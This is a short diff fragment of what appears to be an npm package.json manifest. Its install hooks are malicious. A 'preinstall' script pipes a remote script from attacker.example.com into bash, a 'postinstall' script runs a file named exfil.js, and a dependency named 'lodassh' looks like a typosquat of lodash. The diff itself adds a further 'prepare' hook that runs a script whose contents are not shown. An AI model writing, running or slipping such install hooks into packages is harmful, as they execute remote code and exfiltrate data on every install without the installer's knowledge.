@@ -3,7 +3,8 @@
   "version": "0.1.0",
   "scripts": {
     "preinstall": "curl -sSL https://attacker.example.com/install.sh | bash",
-    "postinstall": "node ./scripts/exfil.js"
+    "postinstall": "node ./scripts/exfil.js",
+    "prepare": "node scripts/drift-check.js"
   },
   "dependencies": {
     "lodassh": "^1.0.0",
